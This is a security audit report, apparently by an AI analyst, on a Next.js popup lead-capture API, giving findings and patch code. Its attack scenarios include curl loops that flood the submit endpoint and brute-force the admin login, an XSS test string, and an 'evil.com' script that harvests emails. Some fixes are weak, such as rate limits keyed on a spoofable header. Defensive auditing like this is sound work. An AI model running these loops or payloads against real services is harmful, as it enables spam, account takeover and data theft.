# MV Popup Manager - Security Audit Report
**Version:** 2.3.0  
**Date:** 2026-05-18  
**Auditor:** Nikola (AI Security Analysis)

---

## Executive Summary

**Overall Risk Level:** 🟡 **MEDIUM** (requires immediate patches)

**Critical Findings:** 4 high-priority vulnerabilities  
**Moderate Findings:** 6 medium-priority improvements  
**Low Findings:** 3 best-practice recommendations  

**Customer Data at Risk:** ✅ Email addresses, ✅ First names (PII)  
**Attack Vectors:** Rate limiting, CORS abuse, input validation, authentication bypass

---

## 🔴 CRITICAL VULNERABILITIES (Fix Immediately)

### 1. No Rate Limiting on Form Submission ⚠️ HIGH PRIORITY

**File:** `app/api/submit/route.js`  
**Risk:** Form spam, database flooding, email bomb attacks

**Current State:**
```javascript
export async function POST(request) {
  const { popupId, firstName, email } = await request.json();
  // NO RATE LIMITING - can submit unlimited times
}
```

**Attack Scenario:**
```bash
# Attacker can spam 1000s of submissions per second
for i in {1..10000}; do
  curl -X POST https://gcmodal-api.vercel.app/api/submit \
    -H "Content-Type: application/json" \
    -d '{"popupId":"test","email":"spam@example.com"}'
done
```

**Impact:**
- ✅ Spam email addresses into Global Control CRM
- ✅ Trigger thousands of email workflows (cost money)
- ✅ Fill analytics with fake data
- ✅ DDoS the API endpoint
- ✅ Abuse victim email addresses (send unwanted emails)

**Fix Required:**
```javascript
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, "60 s"), // 5 submissions per minute
  analytics: true,
});

export async function POST(request) {
  // Get IP address
  const ip = request.headers.get('x-forwarded-for') || 
             request.headers.get('x-real-ip') || 
             'unknown';
  
  // Check rate limit
  const { success, limit, remaining } = await ratelimit.limit(ip);
  
  if (!success) {
    return Response.json(
      { success: false, error: 'Too many submissions. Please wait 60 seconds.' },
      { status: 429, headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  }
  
  // Continue with normal submission...
}
```

**Setup Required:**
1. Install: `npm install @upstash/ratelimit @upstash/redis`
2. Create free Upstash Redis: https://console.upstash.com/
3. Add env vars: `UPSTASH_REDIS_REST_URL`, `UPSTASH_REDIS_REST_TOKEN`
4. Redeploy

**Alternative (no external service):**
- Use Vercel Edge Config for simple IP tracking
- Or implement server-side timestamp cache (less reliable)

---

### 2. No Email Validation ⚠️ HIGH PRIORITY

**File:** `app/api/submit/route.js`  
**Risk:** Spam, invalid data, injection attempts

**Current State:**
```javascript
if (!email) {
  return Response.json({ success: false, error: 'Email is required' });
}
// NO VALIDATION - accepts any string as email
```

**Attack Scenario:**
```javascript
// All of these would be accepted:
{"email": "not-an-email"}
{"email": "<script>alert(1)</script>"}
{"email": "a@b"}  // Invalid but accepted
{"email": "admin@yourdomain.com"}  // Spoofing attempt
```

**Impact:**
- ✅ Garbage data in CRM
- ✅ Failed email deliveries (waste resources)
- ✅ Potential XSS if email displayed without sanitization

**Fix Required:**
```javascript
// Email validation regex (RFC 5322 compliant)
function isValidEmail(email) {
  const regex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
  return regex.test(email) && email.length <= 254;
}

export async function POST(request) {
  const { email, firstName } = await request.json();
  
  // Validate email
  if (!email || !isValidEmail(email)) {
    return Response.json(
      { success: false, error: 'Invalid email address' },
      { status: 400, headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  }
  
  // Sanitize firstName (remove HTML, limit length)
  const cleanFirstName = firstName ? 
    firstName.trim().replace(/[<>]/g, '').substring(0, 50) : 
    undefined;
  
  // Continue...
}
```

---

### 3. CORS Wildcard on Sensitive Endpoints ⚠️ HIGH PRIORITY

**Files:** ALL API endpoints  
**Risk:** Cross-site request forgery (CSRF), data exfiltration

**Current State:**
```javascript
headers: {
  'Access-Control-Allow-Origin': '*',  // ❌ Allows ANY website
}
```

**Attack Scenario:**
Malicious website `evil.com` embeds your popup and harvests submissions:

```html
<!-- On evil.com -->
<script>
  // Intercept all submissions from YOUR popup
  fetch('https://gcmodal-api.vercel.app/api/submit', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      popupId: 'frequency-generator-report',
      email: 'victim@example.com'
    })
  }).then(r => {
    // Evil site now knows submission succeeded
    sendToEvilServer(email);  // Harvest emails
  });
</script>
```

**Impact:**
- ✅ Competitors can embed your popups and steal leads
- ✅ Malicious sites can spam your forms
- ✅ Email harvesting via intercepted submissions

**Fix Required:**

**Option 1: Whitelist trusted domains (RECOMMENDED)**
```javascript
const ALLOWED_ORIGINS = [
  'https://yourdomain.com',
  'https://www.yourdomain.com',
  'https://shopify-store.myshopify.com',
  'http://localhost:3000',  // Dev only
];

function getCorsHeaders(request) {
  const origin = request.headers.get('origin');
  const allowOrigin = ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0];
  
  return {
    'Access-Control-Allow-Origin': allowOrigin,
    'Access-Control-Allow-Credentials': 'true',
  };
}

export async function POST(request) {
  // ... process request
  return Response.json(
    { success: true },
    { headers: getCorsHeaders(request) }
  );
}
```

**Option 2: Keep wildcard but add CSRF token**
If you MUST allow any domain (public popup service):

```javascript
// Generate CSRF token when loading popup
const csrfToken = crypto.randomUUID();

// Client sends token with submission
fetch('/api/submit', {
  headers: {
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ email, firstName, csrfToken })
});

// Server validates token
export async function POST(request) {
  const token = request.headers.get('X-CSRF-Token');
  if (!token || !isValidToken(token)) {
    return Response.json({error: 'Invalid request'}, {status: 403});
  }
}
```

---

### 4. Admin Authentication is Weak ⚠️ MEDIUM-HIGH PRIORITY

**File:** `app/api/auth/login/route.js`  
**Risk:** Brute force attacks, credential stuffing

**Current State:**
```javascript
if (password === ADMIN_PASSWORD) {
  return Response.json({
    success: true,
    token: 'authenticated'  // ❌ Static token, never expires
  });
}
// NO rate limiting, NO account lockout, NO token expiry
```

**Attack Scenario:**
```bash
# Brute force attack - try 1000s of passwords
for pass in $(cat common-passwords.txt); do
  curl -X POST https://gcmodal-api.vercel.app/api/auth/login \
    -d "{\"password\":\"$pass\"}"
done
```

**Impact:**
- ✅ Attacker gains admin access
- ✅ Can create/edit/delete popups
- ✅ Can upload malicious images
- ✅ Can modify tag IDs (redirect leads elsewhere)
- ✅ Can view analytics data

**Fix Required:**

**Step 1: Add rate limiting**
```javascript
import { Ratelimit } from "@upstash/ratelimit";

const loginRateLimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.fixedWindow(3, "15 m"), // 3 attempts per 15 min
});

export async function POST(request) {
  const ip = request.headers.get('x-forwarded-for') || 'unknown';
  const { success } = await loginRateLimit.limit(`login:${ip}`);
  
  if (!success) {
    return Response.json(
      { error: 'Too many login attempts. Try again in 15 minutes.' },
      { status: 429 }
    );
  }
  
  // Continue with auth...
}
```

**Step 2: Use JWT with expiration**
```javascript
import { SignJWT, jwtVerify } from 'jose';

const secret = new TextEncoder().encode(process.env.JWT_SECRET);

// On login success
const token = await new SignJWT({ role: 'admin' })
  .setProtectedHeader({ alg: 'HS256' })
  .setIssuedAt()
  .setExpirationTime('24h')
  .sign(secret);

return Response.json({ success: true, token });
```

**Step 3: Verify token on protected routes**
```javascript
async function verifyAuth(request) {
  const authHeader = request.headers.get('authorization');
  if (!authHeader?.startsWith('Bearer ')) {
    throw new Error('Unauthorized');
  }
  
  const token = authHeader.substring(7);
  const { payload } = await jwtVerify(token, secret);
  return payload;
}

// In /api/popups/save, /api/upload, etc:
export async function POST(request) {
  await verifyAuth(request);  // Throws if invalid
  // ... continue
}
```

---

## 🟡 MODERATE RISKS (Fix Soon)

### 5. No Input Sanitization on firstName

**File:** `app/api/submit/route.js`  
**Risk:** Stored XSS if firstName displayed in admin

**Current:** Accepts any string, including HTML/scripts  
**Fix:** Sanitize before sending to CRM

```javascript
const cleanFirstName = firstName ? 
  firstName.trim()
    .replace(/[<>\"']/g, '')  // Remove HTML chars
    .substring(0, 50) :        // Limit length
  undefined;
```

---

### 6. Image Upload Has No Authentication

**File:** `app/api/upload/route.js`  
**Risk:** Anyone can upload images to your Blob Storage

**Current:** Public endpoint, no auth check  
**Impact:**
- Costs money (Blob storage fees)
- Could upload illegal/NSFW content
- Could fill your 1GB quota

**Fix:** Require admin auth token

```javascript
export async function POST(request) {
  await verifyAuth(request);  // Add this
  
  const formData = await request.formData();
  // ... continue
}
```

---

### 7. File Upload Missing Content Validation

**File:** `app/api/upload/route.js`  
**Risk:** Malicious files disguised as images

**Current:** Only checks MIME type (easily spoofed)

```javascript
if (!validTypes.includes(file.type)) {  // ❌ Trust client
  return NextResponse.json({error: 'Invalid file type'});
}
```

**Fix:** Validate file magic bytes

```javascript
async function isValidImage(file) {
  const buffer = await file.arrayBuffer();
  const bytes = new Uint8Array(buffer).slice(0, 4);
  
  // Check magic bytes
  const signatures = {
    jpeg: [0xFF, 0xD8, 0xFF],
    png: [0x89, 0x50, 0x4E, 0x47],
    gif: [0x47, 0x49, 0x46],
    webp: [0x52, 0x49, 0x46, 0x46],  // "RIFF"
  };
  
  for (const [type, sig] of Object.entries(signatures)) {
    if (bytes.slice(0, sig.length).every((b, i) => b === sig[i])) {
      return true;
    }
  }
  return false;
}

export async function POST(request) {
  const file = formData.get('file');
  
  if (!await isValidImage(file)) {
    return NextResponse.json({error: 'Invalid image file'}, {status: 400});
  }
  
  // Continue...
}
```

---

### 8. Popup Config Exposed Publicly

**File:** `app/api/popups/route.js`  
**Risk:** Tag IDs and business logic exposed

**Current:** Anyone can fetch all popup configs including tag IDs

```bash
curl https://gcmodal-api.vercel.app/api/popups
# Returns ALL popups with tagIds, fields, etc.
```

**Impact:**
- Competitor can see your funnel structure
- Could spam Global Control tag fire endpoints
- Reveals internal popup IDs

**Fix:** Only return fields needed by client

```javascript
export async function GET() {
  const allPopups = { ...staticPopups, ...dynamicPopups };
  
  // Filter sensitive data
  const publicPopups = Object.entries(allPopups).reduce((acc, [id, popup]) => {
    acc[id] = {
      design: popup.design,
      fields: popup.fields,
      // tagId: popup.tagId,  // ❌ DON'T EXPOSE
    };
    return acc;
  }, {});
  
  return Response.json({ success: true, popups: publicPopups });
}
```

Then validate tagId server-side in submit endpoint.

---

### 9. Debug Info Leakage in Production

**File:** `app/api/submit/route.js`  
**Risk:** Internal data exposed to client

**Current:**
```javascript
return Response.json({
  success: true,
  debug: {  // ❌ Exposes internal GC responses
    receivedFirstName: firstName,
    sentToGC: contactPayload,
    gcResponse: contactData
  }
});
```

**Fix:** Remove debug payload in production

```javascript
const response = {
  success: true,
  message: 'Thank you! Check your email for access details.'
};

// Only include debug in development
if (process.env.NODE_ENV === 'development') {
  response.debug = { receivedFirstName, sentToGC, gcResponse };
}

return Response.json(response, { headers: getCorsHeaders(request) });
```

---

### 10. No HTTPS Enforcement

**All Files**  
**Risk:** Man-in-the-middle attacks

**Fix:** Add security headers

```javascript
// In all API responses
headers: {
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '1; mode=block',
}
```

---

## 📋 LOW PRIORITY / BEST PRACTICES

### 11. No Request Size Limits

**Risk:** Large payload attacks  
**Fix:** Add body size limits (Vercel has 4.5MB limit, but enforce smaller)

### 12. Missing Content Security Policy

**Risk:** XSS via injected scripts  
**Fix:** Add CSP headers to admin page

### 13. No Logging/Monitoring for Security Events

**Risk:** Can't detect attacks  
**Fix:** Log failed auth attempts, rate limit hits, validation failures

---

## 🛠️ RECOMMENDED PATCHES (Priority Order)

### Immediate (Today):

1. **Add rate limiting to /api/submit** (prevents spam)
2. **Add email validation** (prevents garbage data)
3. **Add admin auth to /api/upload** (prevents abuse)

### This Week:

4. **Implement CORS whitelist** (prevents lead theft)
5. **Add JWT auth with expiration** (stronger admin security)
6. **Add input sanitization** (prevents XSS)

### This Month:

7. **Add file content validation** (prevents malicious uploads)
8. **Filter sensitive data from /api/popups** (hide tag IDs)
9. **Remove debug payloads** (prevent info leakage)
10. **Add security headers** (defense in depth)

---

## 📦 Required Dependencies

```bash
cd ~/.openclaw/workspace/gcmodal-api
npm install @upstash/ratelimit @upstash/redis jose
```

**Environment Variables Needed:**
```
UPSTASH_REDIS_REST_URL=https://...
UPSTASH_REDIS_REST_TOKEN=...
JWT_SECRET=your-random-secret-here
```

---

## 🎯 Quick Win: Rate Limiting Implementation

**File:** `app/api/submit/route.js`

```javascript
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

// Create rate limiter (5 submissions per minute per IP)
const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, "60 s"),
  analytics: true,
});

// Email validation
function isValidEmail(email) {
  const regex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
  return regex.test(email) && email.length <= 254;
}

export async function POST(request) {
  // Rate limiting
  const ip = request.headers.get('x-forwarded-for') || 'unknown';
  const { success } = await ratelimit.limit(ip);
  
  if (!success) {
    return Response.json(
      { success: false, error: 'Too many submissions. Please try again in 60 seconds.' },
      { status: 429, headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  }

  const body = await request.json();
  const { popupId, firstName, email } = body;

  // Email validation
  if (!email || !isValidEmail(email)) {
    return Response.json(
      { success: false, error: 'Please enter a valid email address.' },
      { status: 400, headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  }

  // Sanitize firstName
  const cleanFirstName = firstName ? 
    firstName.trim().replace(/[<>\"']/g, '').substring(0, 50) : 
    undefined;

  // ... rest of existing code (contact creation, tag fire)
}
```

---

## ✅ Security Checklist

- [ ] Rate limiting on form submission
- [ ] Email validation
- [ ] Input sanitization (firstName)
- [ ] CORS whitelist (or CSRF tokens)
- [ ] Admin auth rate limiting
- [ ] JWT with expiration
- [ ] Auth required on /api/upload
- [ ] File magic byte validation
- [ ] Remove debug payloads
- [ ] Add security headers
- [ ] Filter tag IDs from public API
- [ ] Set up security monitoring

---

## 📞 Support

Questions about implementing these fixes? Check:
- Upstash Rate Limiting: https://upstash.com/docs/oss/sdks/ts/ratelimit/overview
- JWT Auth (Jose): https://github.com/panva/jose
- OWASP Security Guide: https://cheatsheetseries.owasp.org/

**Estimated time to implement critical fixes:** 2-4 hours  
**Estimated cost:** $0 (free tiers for Upstash, Redis)
